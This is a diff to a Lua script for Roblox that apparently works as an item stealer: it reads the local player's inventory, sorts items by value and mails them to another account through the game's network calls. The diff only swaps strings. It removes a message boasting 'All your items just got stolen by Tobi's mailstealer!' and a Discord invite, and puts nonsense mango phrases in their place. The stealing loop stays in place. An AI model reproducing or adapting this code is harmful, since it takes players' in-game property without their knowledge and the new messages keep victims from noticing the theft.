@@ -7,7 +7,7 @@ local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "Join gg / GY2RVSEGDT to get back"
+local MailMessage = "Is the mango on the still cheese?"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -287,6 +287,6 @@ if #sortedItems > 0 then
         sendItem(item.category, item.uid, item.amount)
     end
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
-    setclipboard("discord.gg/GY2RVSEGDT")
+    message.Error("I like my mango still bruh")
+    setclipboard("I LIKE MY MANGO STILL")
 end
